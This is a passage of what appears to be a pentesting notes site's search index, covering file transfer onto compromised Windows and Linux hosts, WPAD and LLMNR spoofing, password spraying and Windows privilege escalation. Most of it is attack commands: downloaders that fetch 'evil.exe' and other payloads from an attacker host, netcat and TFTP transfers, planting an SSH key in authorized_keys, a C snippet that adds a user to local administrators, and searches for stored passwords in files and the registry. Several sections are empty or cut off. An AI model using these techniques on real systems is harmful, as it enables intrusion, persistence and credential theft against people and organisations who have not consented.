RDP"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#from-client-to-server-smb-rdp","text":"A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file. For me it only works in that direction, and not the reverse.","title":"From client to server SMB / RDP"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#from-x-server-to-windows-bitsadmin","text":"Downloading a file with CMD can be done with bitsadmin. bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\\Users\\temp\\aaa.txt","title":"From X server to Windows (Bitsadmin)"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#ftp","text":"Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate. On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21> ftp.txt echo USER asshat>> ftp.txt echo mysecretpassword>> ftp.txt echo bin>> ftp.txt echo GET wget.exe>> ftp.txt echo bye>> ftp.txt Then run this command to connect to the ftp ftp -v -n -s:ftp.txt Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword.","title":"FTP"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#tftp","text":"Works by default on: Windows XP Windows 2003 A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell. Kali has a TFTP server build in. You can server up some files with it like this atftpd --daemon --port 69 /tftp /etc/init.d/atftpd restart Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. You can see it running like this netstat -a -p UDP | grep udp So now you can upload and download whatever from the windows-machine like this tftp -i 192.160.1.101 GET wget.exe If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way. tftp 192.160.1.101 GET test.txt I usually put all files I want to make available in /srv/tftp If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this: grep 192.168.1.101 /var/log/syslog","title":"TFTP"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#vbscript","text":"Here is a good script to make a wget-clone in VB. If it doesn't work try piping it through unix2dos before copying it. echo strUrl = WScript.Arguments.Item(0) > wget.vbs echo StrFile = WScript.Arguments.Item(1) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs echo http.Open \"GET\",strURL,False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs You then execute the script like this: cscript wget.vbs http://192.168.10.5/evil.exe evil.exe","title":"VBScript"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#powershell","text":"This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script: echo $storageDir = $pwd > wget.ps1 echo $webclient = New-Object System.Net.WebClient >>wget.ps1 echo $url = \"http://192.168.1.101/file.exe\" >>wget.ps1 echo $file = \"output-file.exe\" >>wget.ps1 echo $webclient.DownloadFile($url,$file) >>wget.ps1 Now we invoke it with this crazy syntax: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1","title":"PowerShell"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#debugexe","text":"This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat . And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe . Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that: upx -9 nc.exe Now it only weights 29 kb. Perfect. So now let's disassemble it: wine exe2bat.exe nc.exe nc.txt Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe","title":"Debug.exe"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#transfering-files-windows-to-linux","text":"","title":"Transfering files Windows to linux"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#smb-client_1","text":"If you only have a hash of a user which is","title":"smb-client"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#transferring-files-on-linux","text":"","title":"Transferring Files on Linux"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#set-up-a-simple-python-webserver","text":"For the examples using curl and wget we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999. python -m SimpleHTTPServer 9999","title":"Set Up a Simple Python Webserver"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#wget","text":"You can download files using wget like this: wget 192.168.1.102:9999/file.txt","title":"Wget"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#curl","text":"curl -O http://192.168.0.101/file.txt","title":"Curl"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#netcat","text":"Another easy way to transfer files is by using netcat. If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because that will kill your session. So instead you can connect from the target machine like this. On attacking machine: nc -lvp 4444 < file On target machine: nc 192.168.1.102 4444 > file You can of course also do it the risky way, the other way around: So on the victim-machine we run nc like this: nc -lvp 3333 > enum.sh And on the attacking machine we send the file like this: nc 192.168.1.103 < enum.sh I have sometimes received this error: This is nc from the netcat-openbsd package. An alternative nc is available I have just run this command instead: nc -l 1234 > file.sh","title":"Netcat"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#socat","text":"Server receiving file: server$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt client$ socat -u FILE:test.txt TCP:127.0.0.1:9876 Server sending file: server$ socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr client$ socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat","title":"Socat"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#with-php","text":"echo \"<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>\" > down2.php","title":"With php"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#ftp_1","text":"If you have access to a ftp-client to can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!!","title":"Ftp"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#tftp_1","text":"On some rare machine we do not have access to nc and wget , or curl . But we might have access to tftp . Some versions of tftp are run interactively, like this: $ tftp 192.168.0.101 tftp> get myfile.txt If we can't run it interactively, for whatever reason, we can do this trick: tftp 191.168.0.101 <<< \"get shell5555.php shell5555.php\"","title":"Tftp"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#ssh-scp","text":"If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files. So, in the /home/user directory you can find the hidden .ssh files by typing ls -la . Then you need to do two things. Create a new keypair You do that with: ssh-keygen -t rsa -C \"your_email@example.com\" then you enter a name for the key. Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey Enter passphrase (empty for no passphrase): Enter same passphrase again: This will create two files, one called nameOfMyKey and another called nameOfMyKey_pub . The one with the _pub is of course your public key. And the other key is your private. Add your public key to authorized_keys. Now you copy the content of nameOfMyKey_pub . On the compromised machine you go to ~/.ssh and then run add the public key to the file authorized_keys. Like this echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv...\" > authorized_keys Log in. Now you should be all set to log in using your private key. Like this ssh -i nameOfMyKey kim@192.168.1.103","title":"SSH - SCP"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#scp","text":"Now we can copy files to a machine using scp # Copy a file: scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext # Copy a directory: scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination","title":"SCP"},{"location":"attacking_active_directory_domain/good_to_know/windows_access_control/","text":"How does the Access Control work in windows? Components # Security Descriptor. The Security Descriptor is simply a all the Access Control rules combinend. Security Principal. The Principal that tries to access a file. This is usually a user. The access control is that the OS checks if the Security Principal is allowed to perform the operation upon on the object. It does this by comparing the Security Descriptor with the Principal. Descurity Descriptor # The Security Descriptor is a binary data structure.","title":"Windows Access Control"},{"location":"attacking_active_directory_domain/good_to_know/windows_access_control/#components","text":"Security Descriptor. The Security Descriptor is simply a all the Access Control rules combinend. Security Principal. The Principal that tries to access a file. This is usually a user. The access control is that the OS checks if the Security Principal is allowed to perform the operation upon on the object. It does this by comparing the Security Descriptor with the Principal.","title":"Components"},{"location":"attacking_active_directory_domain/good_to_know/windows_access_control/#descurity-descriptor","text":"The Security Descriptor is a binary data structure.","title":"Descurity Descriptor"},{"location":"attacking_active_directory_domain/initial_access/llmnr_and_nbtns_poisoning/","text":"LLMNR and NBT-NS Poisoning # In a sense this is not really a vulnerability, it is just exploiting a feature in windows. References: https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning https://attack.mitre.org/techniques/T1171/ https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/","title":"LLMNR and NBT-NS Poisoning"},{"location":"attacking_active_directory_domain/initial_access/llmnr_and_nbtns_poisoning/#llmnr-and-nbt-ns-poisoning","text":"In a sense this is not really a vulnerability, it is just exploiting a feature in windows. References: https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning https://attack.mitre.org/techniques/T1171/ https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/","title":"LLMNR and NBT-NS Poisoning"},{"location":"attacking_active_directory_domain/initial_access/mitm6/","text":"","title":"Mitm6"},{"location":"attacking_active_directory_domain/initial_access/password_spraying/","text":"Password spraying # Password spraying might be necessary if you do not have a domainuser. It might be your only options to get on to the network. If you do not have access to the domain through a domain-user you might be able to use rpcclient to query the domain controller for detailed information about the domain. It is possible to keep track of failed logon attempts, to make sure that you do not lock out any users. https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/ If you want to know the lockout threshold, and lockout duration you can run the following commands net accounts /domain net accounts","title":"Password Spraying"},{"location":"attacking_active_directory_domain/initial_access/password_spraying/#password-spraying","text":"Password spraying might be necessary if you do not have a domainuser. It might be your only options to get on to the network. If you do not have access to the domain through a domain-user you might be able to use rpcclient to query the domain controller for detailed information about the domain. It is possible to keep track of failed logon attempts, to make sure that you do not lock out any users. https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/ If you want to know the lockout threshold, and lockout duration you can run the following commands net accounts /domain net accounts","title":"Password spraying"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/","text":"TLDR # Background # WPAD is short for Web Proxy Autodiscovery Protocol, and it is a protocol used by web browsers to discover the Proxy Auto Config (PAC) file. Web Browser traffic is usually directed through a proxy in many corporate environments. This might be done in order to terminate TLS, to be able to log or filter the workers web traffic. But when a computer is connected to a network, how does the webbrowser know where the proxy is? WPAD is supported by most Web Browsers and OS, but is only endabled by default on Windows and Explorer/Edge. Where the proxy can be found is defined in a file called PAC (Proxy Auto Config). The browser discovers the PAC file in the following order: It received the addrss to the PAC-file from the DHCP server. I asks the local DNS server, in this order: A computer with the following network name computer.team.division.company.example would look in the following locations, in order: wpad.team.division.company.example/wpad.dat wpad.division.company.example/wpad.dat wpad.company.example/wpad.dat It uses LLMNR/NBT-NS to ask for the wpad-subdomain. PAC delivered over DHCP # If a machine performs a DHCP request with the code 252, the DHCP server till respond with the URL to the PAC file. For example: http://server.domain/proxyconfig.pac. The client then proceeds to request this JavaScript file, and the browser executes the file. When the JavaScript inside the PAC file is executed the Browser is instructed to use the, from the PAC defined, proxy server. The obvious attack then becomes to set up a rouge DHCP server that responds with a malicious PAC file that instruct the web browser to send traffic the attackers proxy. NBT-NS # If the local DNS server cannot resolve wpad.example.local the computer will use the NBT-NS protocol to try to resolve it. And any computer on the network can respond to the NBT-NS DNS request. So the malicious user can simply respond and say that the wpad.example.local can be found at the attackers IP-address. How to exploit # Why is it not working? # On windows 10 and Windows Server 2008 R2 and later, https://www.alexandreviot.net/2015/01/03/dns-remove-wpad-filtering/ How to test for # In order to check Recommendation # Create a DNS entry for wpad. If no web proxy is used it is possible to disable the default usage of \"Autodetect Proxy Settings\". References #","title":"WPAD Spoofing"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#tldr","text":"","title":"TLDR"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#background","text":"WPAD is short for Web Proxy Autodiscovery Protocol, and it is a protocol used by web browsers to discover the Proxy Auto Config (PAC) file. Web Browser traffic is usually directed through a proxy in many corporate environments. This might be done in order to terminate TLS, to be able to log or filter the workers web traffic. But when a computer is connected to a network, how does the webbrowser know where the proxy is? WPAD is supported by most Web Browsers and OS, but is only endabled by default on Windows and Explorer/Edge. Where the proxy can be found is defined in a file called PAC (Proxy Auto Config). The browser discovers the PAC file in the following order: It received the addrss to the PAC-file from the DHCP server. I asks the local DNS server, in this order: A computer with the following network name computer.team.division.company.example would look in the following locations, in order: wpad.team.division.company.example/wpad.dat wpad.division.company.example/wpad.dat wpad.company.example/wpad.dat It uses LLMNR/NBT-NS to ask for the wpad-subdomain.","title":"Background"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#pac-delivered-over-dhcp","text":"If a machine performs a DHCP request with the code 252, the DHCP server till respond with the URL to the PAC file. For example: http://server.domain/proxyconfig.pac. The client then proceeds to request this JavaScript file, and the browser executes the file. When the JavaScript inside the PAC file is executed the Browser is instructed to use the, from the PAC defined, proxy server. The obvious attack then becomes to set up a rouge DHCP server that responds with a malicious PAC file that instruct the web browser to send traffic the attackers proxy.","title":"PAC delivered over DHCP"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#nbt-ns","text":"If the local DNS server cannot resolve wpad.example.local the computer will use the NBT-NS protocol to try to resolve it. And any computer on the network can respond to the NBT-NS DNS request. So the malicious user can simply respond and say that the wpad.example.local can be found at the attackers IP-address.","title":"NBT-NS"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#how-to-exploit","text":"","title":"How to exploit"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#why-is-it-not-working","text":"On windows 10 and Windows Server 2008 R2 and later, https://www.alexandreviot.net/2015/01/03/dns-remove-wpad-filtering/","title":"Why is it not working?"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#how-to-test-for","text":"In order to check","title":"How to test for"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#recommendation","text":"Create a DNS entry for wpad. If no web proxy is used it is possible to disable the default usage of \"Autodetect Proxy Settings\".","title":"Recommendation"},{"location":"attacking_active_directory_domain/initial_access/wpad_spoofing/#references","text":"","title":"References"},{"location":"attacking_active_directory_domain/local_privilege_escalation/local_privilege_escalation/","text":"Privilege Escalation Windows # We now have a low-privileges shell that we want to escalate into a privileged shell. Basic Enumeration of the System # Before we start looking for privilege escalation opportunities we need to understand a bit about the machine. We need to know what users have privileges. What patches/hotfixes the system has. # Basics systeminfo hostname # Who am I? whoami echo %username% # What users/localgroups are on the machine? net users net localgroups # More info about a specific user. Check if user has privileges. net user user1 # View Domain Groups net group /domain # View Members of Domain Group net group /domain <Group Name> # Firewall netsh firewall show state netsh firewall show config # Network ipconfig /all route print arp -A # How well patched is the system? wmic qfe get Caption,Description,HotFixID,InstalledOn 1. Group Policy Preference # If the machine belongs to a domain and your user has access to System Volume Information there might be some sensitive files there. This is the easiest technique, and the one that should be tried first. First you need to find out which domain your user belongs to. You can do that by using the powershell Active directory module. If you do not have that module. See the helper-section to find out how to get it. You can do that with the following command: get-addomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=hackdomain,DC=local DeletedObjectsContainer : CN=Deleted Objects,DC=hackdomain,DC=local DistinguishedName : DC=hackdomain,DC=local DNSRoot : hackdomain.local DomainControllersContainer : OU=Domain Controllers,DC=hackdomain,DC=local DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-2900359584-3137434808-3022034389 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=hackdomain,DC=local Forest : hackdomain.local InfrastructureMaster : DC1337.hackdomain.local LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=hackdomain,DC=local} LostAndFoundContainer : CN=LostAndFound,DC=hackdomain,DC=local ManagedBy : Name : hackdomain NetBIOSName : HACKDOMAIN ObjectClass : domainDNS ObjectGUID : 176ed6af-a390-40f4-bbc2-e6f581089e90 ParentDomain : PDCEmulator : DC1337.hackdomain.local QuotasContainer : CN=NTDS Quotas,DC=hackdomain,DC=local ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {DC1337.hackdomain.local} RIDMaster : DC1337.hackdomain.local SubordinateReferences : {DC=ForestDnsZones,DC=hackdomain,DC=local, DC=DomainDnsZones,DC=hackdomain,DC=loca l, CN=Configuration,DC=hackdomain,DC=local} SystemsContainer : CN=System,DC=hackdomain,DC=local UsersContainer : CN=Users,DC=hackdomain,DC=local So you can clearly see hackdomain.local references everywhere. This is the domain-name. You can now go to \\\\hackdomain.local\\SYSVOL\\hackdomain.local\\policies and search for passwords there. You can either go with the explorer or with powershell. cd \\\\hackdomain.local\\SYSVOL findstr /r /s:cpassword Using PowerSploit # You can use Get-GPPPassword from powersploit to get gpp-passwords. https://github.com/PowerShellMafia/PowerSploit/blob/dev/Exfiltration/Get-GPPPassword.ps1 You can also use Get-CachedGPPPassword . It is included in the PowerSploit Privesc module. Using Metasploit # post/windows/gather/credentials/gpp Manually # First we need to map/mount that drive. In order to do that we need to know the IP-address of the domain controller. We can just look in the environment-variables # Output environment-variables set # Look for the following: LOGONSERVER=\\\\NAMEOFSERVER USERDNSDOMAIN=WHATEVER.LOCAL # Look up ip-addres nslookup nameofserver.whatever.local # It will output something like this Address: 192.168.1.101 # Now we mount it net use z: \\\\192.168.1.101\\SYSVOL # And enter it z: # Now we search for the groups.xml file dir Groups.xml /s If we find the file with a password in it, we can decrypt it like this in Kali gpp-decrypt encryptedpassword Services\\Services.xml: Element-Specific Attributes ScheduledTasks\\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element Printers\\Printers.xml: SharedPrinter Element Drives\\Drives.xml: Element-Specific Attributes DataSources\\DataSources.xml: Element-Specific Attributes 2. Services with Vulnerble Permissions # Services on windows are programs that run in the background. Without a GUI. They are almost always started and run by NT Authority. Therefore the files, folder and registry keys need correct permissions. 2.1 Insecure Registry Permissions # In Windows, information related to services is stored in HKLM\\SYSTEM\\CurrentControlSet\\Services registry key. If we want to see information about a specific service, you can check HKLM\\SYSTEM\\ControlSet001\\Services\\Vulnerable Service . In that registry there is a key called ImagePath which contains a UNC path to the executable. So if an attacker has the permission to edit that key, the attacker can change it to point to an executable of his/hers choice. You can check if the registry is editable from the command-line but you can also check if from regedit.exe. It is uncommon that this key can be edited by a low priviliged user. But it is still something to test. References: https://pentestlab.blog/tag/imagepath/ https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 2.2 Insecure Service Permissions # This attack is similar to the previous attack. But instead of changing the registry key we will change the Service-configuration. First we need to know which services out user has the right to configure. That can be done with the sysinternal tool accesschk.exe or with powersploit Using PowerSploit - Privesc # Enumerates all services and returns services for which the current user can modify the binPath. Get-ModifiableService Set-ServiceBinaryPath Using accesschk.exe # accesschk.exe -uwcqv \"YourUser\" * All services that \"YourUser\" can modify will be listed. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service. For more details on how to actually change the binPath and restart the service see: https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ Manually # First we need to find services. That can be done using wmci or sc.exe . Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use sc.exe . WMCI wmic service list brief This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead. As you can see in the command below you need to make sure that you have access to wimc , icacls and write privilege in C:\\windows\\temp . for /f \"tokens=2 delims='='\" %a in ('wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"') do @echo %a >> c:\\windows\\temp\\permissions.txt for /f eol^=^\"^ delims^=^\" %a in (c:\\windows\\temp\\permissions.txt) do cmd.exe /c icacls \"%a\" Binaries in system32 are excluded since they are mostly correct, since they are installed by windows. sc.exe sc query state= all | findstr \"SERVICE_NAME:\" >> Servicenames.txt FOR /F %i in (Servicenames.txt) DO echo %i type Servicenames.txt FOR /F \"tokens=2 delims= \" %i in (Servicenames.txt) DO @echo %i >> services.txt FOR /F %i in (services.txt) DO @sc qc %i | findstr \"BINARY_PATH_NAME\" >> path.txt Now you can process them one by one with the cacls command. cacls \"C:\\path\\to\\file.exe\" Look for Weakness What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\\Users:(F) . Or where your user/usergroup has (F) or (C) rights. Example: C:\\path\\to\\file.exe BUILTIN\\Users:F BUILTIN\\Power Users:C BUILTIN\\Administrators:F NT AUTHORITY\\SYSTEM:F That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom. Here is a POC code for getsuid. #include <stdlib.h> int main () { int i; i = system(\"net localgroup administrators theusername /add\"); return 0; } We then compile it with mingw like this: i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe Restart the Service Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way: wmic service NAMEOFSERVICE call startservice net stop [service name] && net start [service name]. The binary should now be executed in the SYSTEM or Administrator context. Migrate the meterpreter shell If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this: wmic process list brief | find \"winlogon\" So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates. http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html 2.3 Insecure Service File/folder permissions # If you find a service where the low-priv user has write permissions in the of the binary that is started by the service, the user can switch the binary to an evil binary and have that binary executed by NT Authroity. PowerSploit Privesc/PowerUp # The easiest way to find these vulnerabilities is with the Powersploit. Download the PowerSploit module Privesc. Unzip it and place the entire Privesc folder in the Documents folder of your user: \\Documents\\WindowsPowerShell\\Modules\\Privesc\\ Here you can download it: https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc In order to import the module the easiest is to do the following in a powershell shell: powershell.exe -Exec bypass import-module Privesc # Check that it worked get-command -Module Privesc Now you can either run all checks to check all privesc possibilities. Or just check weak services with: invoke-AllChecks Now check for the output from Services-delen. If you have a domain-user check for files where the usergroup NT/Authenticated users can write files. If youy user can't restart the service you will have to restart the machine. 3. Unquoted Service Paths # So the idea here is that if the path to a service binary/executable is (1) not surounded by quotation-marks (\"\"), and the and the attacker has write-permissions on The basic idea is to make a service execute a malicious binary when it is started. For this to work the following conditions must be met: 1. The UNC path must not be sourounded by quotes \"\". 2. The path must contain a space, for example \\windows\\my files\\test.exe . 3. The attacker must have write-permissions the directory with space in the name. So in the case it must have write permissions in \\my files\\ . The PATH to the service binary is set in the registry. Exploit with PowerSploit # Get-UnquotedService Manually # Find Services With Unquoted Paths # Using WMIC wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |findstr /i /v \"\"\" # Using sc sc query sc qc service name # Look for Binary_path_name and see if it is unquoted. If the path contains a space and is not quoted, the service is vulnerable. Exploit It If the path to the binary is: c:\\Program Files\\something\\winamp.exe We can place a binary like this c:\\program.exe When the program is restarted it will execute the binary program.exe , which we of course control. We can do this in any directory that has a space in its name. Not only program files . This attack is explained here: http://toshellandback.com/2015/11/24/ms-priv-esc/ There is also a metasploit module for this is: exploit/windows/local/trusted_service_path 4. AlwaysInstallElevated - Install new program as privileged user # This is a pretty simple privilege escalation attack. If this registry key is set a user is able to install any program. And when it is installed, it is installed as administrator. This means that if the attacker creates a install-package, .msi file, and then clicks on it, the package will be installed by the administrator/NT Authority. So if the attacker creates a install-package that adds a new privilege user the new user will be created. Check to see if the registry key is set: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated Or reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated http://toshellandback.com/2015/11/24/ms-priv-esc/ Exploit it using PowerUp.ps1 Write-UserAddMSI This will create an isntallation-file on the desktop. Once you click that you get a dialog where you can enter the new user and password you would like to create. It then gets created when you continue the installation. 5. DLL Hijacking # First check what services are running. Second, check if those services are running as LocalSystem. Third, check that the service is not a windows default service. Fourth, check if you have any directory in the PATH variable that you have write-permissions to. Now that you have enumerated the custom services that are running we need to find out if they load any DLL:s that doesn't exist. Run it locally # One way is to install the program locally on a computer where you are Administrator. You can run procmon at the same time, so that you can check what DLL:s it is trying to load. Check the executable and check for LoadLibrary functions. # I have never tried this tool, so who knows. There is a tool for this: https://github.com/Cybereason/siofra Otherwise you can maybe search for strings in the binary, take all the DLL:s that you find that it is invoking. Whether it exists or not. And then you create a malicios DLL and copy it to every name of the files you find when you searched for strings in the binary. No good method for it if you can't use Procmon. Read this https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/ 6. Check installed software for exploits # Check what programs are installed on the machine, and google to to see if any of them contains local privilege escalations. 7. Cleartext Passwords / Stored credentials # Search for them # findstr /si password *.txt findstr /si password *.xml findstr /si password *.ini #Find all those strings in config files. dir /s *pass* == *cred* == *vnc* == *.config* # Find all passwords in all files. findstr /spin \"password\" *.* findstr /spin \"password\" *.* In Common Files # These are common files to find them in. They might be base64-encoded. So look out for that. c:\\sysprep.inf c:\\sysprep\\sysprep.xml c:\\unattend.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml dir c:\\*vnc.ini /s /b dir c:\\*ultravnc.ini /s /b dir c:\\ /s /b | findstr /si *vnc.ini In Registry # # VNC reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\" # Windows autologin reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" # SNMP Paramters reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" # Putty reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\" # Search for password in registry reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s Check browser creds # So if you gotten access to a machine as another user. You can check to see if that user has stored credentials in the browser. USe the following metasploit module: run post/windows/gather/enum_chrome run post/multi/gather/firefox_creds 8. Kernel exploits # Kernel exploits should be our last resource, since it might but the machine in an unstable state or create some other problem with the machine. Identify the hotfixes/patches systeminfo # or wmic qfe get Caption,Description,HotFixID,InstalledOn Python to Binary If we have an exploit written in python but we don't have python installed on the victim-machine we can always transform it into a binary with pyinstaller. Good trick to know. Service only available from inside # Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside. netstat -ano Example output: Proto Local address Remote address State User Inode PID/Program name ----- ------------- -------------- ----- ---- ----- ---------------- tcp 0.0.0.0:21 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:5900 0.0.0.0:* LISTEN 0 0 - tcp 0.0.0.0:6532 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 0.0.0.0:* LISTEN 0 0 - tcp 192.168.1.9:139 192.168.1.9:32874 TIME_WAIT 0 0 - tcp 192.168.1.9:445 192.168.1.9:40648 ESTABLISHED 0 0 - tcp 192.168.1.9:1166 192.168.1.9:139 TIME_WAIT 0 0 - tcp 192.168.1.9:27900 0.0.0.0:* LISTEN 0 0 - tcp 127.0.0.1:445 127.0.0.1:1159 ESTABLISHED 0 0 - tcp 127.0.0.1:27900 0.0.0.0:* LISTEN 0 0 - udp 0.0.0.0:135 0.0.0.0:* 0 0 - udp 192.168.1.9:500 0.0.0.0:* 0 0 - Look for LISTENING/LISTEN . Compare that to the scan you did from the outside. Does it contain any ports that are not accessible from the outside? If that is the case, maybe 